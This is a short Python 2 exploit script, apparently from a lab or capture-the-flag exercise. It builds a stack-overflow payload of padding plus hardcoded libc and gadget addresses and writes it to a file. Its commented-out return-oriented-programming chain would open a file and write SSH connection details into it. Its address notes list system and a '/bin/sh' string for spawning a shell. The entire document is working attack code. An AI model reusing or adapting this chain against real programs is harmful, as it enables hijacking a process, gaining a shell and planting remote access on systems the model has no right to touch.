def pack64(n):
	s = ""
	while n:
		s += chr(n % 0x100)
		n = n / 0x100
	s = s.ljust(8, "\x00")
	return s

f = open("./exploit", "w")

addr = "test.txt\0"

payload = "A" * (24)
#payload += pack64(0x5555555549e3) # pop rdi; ret;
#payload += pack64(0x7fffffffe1d8) # pointer to path in buf->buf[136]
#payload += pack64(0x555555554755) # pop rsi;
#payload += pack64(0x7ffff79e4ba0) # "w"
#payload += pack64(0x555555554413) # fopen
#
#payload += pack64(0x5555555549e3) # pop rdi; ret;
#payload += pack64(0x5555555545fc) # 0x3 (assuming fd=3 after open)
#payload += pack64(0x555555554755) # pop rsi;
#payload += pack64(0x7fffffffebbd) # string containing of ssh connection details
## there is no pop rdx??
#payload += pack64(0x7ffff7af4140) # write
#payload += pack64(0x5555555549e3) # pop rdi; ret;
#payload += pack64(0x555555554614) # 0x4 (assuming fd=3 after open)
#payload += pack64(0x7ffff7af48c0) # close
#
payload += pack64(0x7ffff7a27120) # exit
#print(len(payload))
#payload += addr

#payload += pack64(0x7ffff7a27120) # exit
#payload = payload.ljust(100)

f.write(payload)
f.close()


# 0x7ffff7af3c40 open
# 0x7ffff7af4140 write
# 0x7ffff7af4070 read
# 0x7fffffffe595 path?

# 0x5555555549e3 pop rdi; ret;
# 0x555555554755 pop rsi;
# 0x7ffff7a33440 system
# 0x7ffff7b97e9a "/bin/sh"
# 0x555555554a50 'r'
# 0x7fffffffe595 rot
